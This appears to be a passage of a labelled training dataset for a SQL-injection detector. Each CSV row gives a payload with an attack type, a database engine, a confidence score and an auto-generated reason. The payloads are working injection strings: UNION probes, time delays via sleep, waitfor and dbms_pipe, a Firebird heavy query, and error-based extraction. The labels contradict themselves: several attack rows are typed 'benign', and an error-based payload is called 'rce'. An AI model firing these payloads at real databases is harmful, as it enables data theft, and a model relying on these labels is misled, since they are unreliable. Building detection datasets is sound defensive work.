row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
9259,"1"" ) as vdim where 1296 = 1296",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
9260,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( '%' = '",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
9261,"1' ) as viex where 6242 = 6242 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",1,,boolean_blind,generic,0.95,6242 = 6242 and detected — boolean_blind injection (priority 8) on generic,rule-based
9262,"1"" or ( select * from ( select ( sleep ( 5 ) ) ) ydpu )",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
9263,"1'+ ( select 'sqje' where 1634 = 1634 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) ) +'",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
9264,"1' ) ) as uncy where 8009 = 8009 union all select null,null,null,null,null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
9265,1'|| ( select 'avxz' from dual where 7815 = 7815,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
9266,1'|| ( select 'glyc' from dual where 4058 = 4058,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
9267,1 ) ) ) waitfor delay '0:0:5' and ( ( ( 3481 = 3481,1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
9268,"1'|| ( select 'ssvp' where 3300 = 3300 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
9269,1' ) as sjij where 8659 = 8659,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
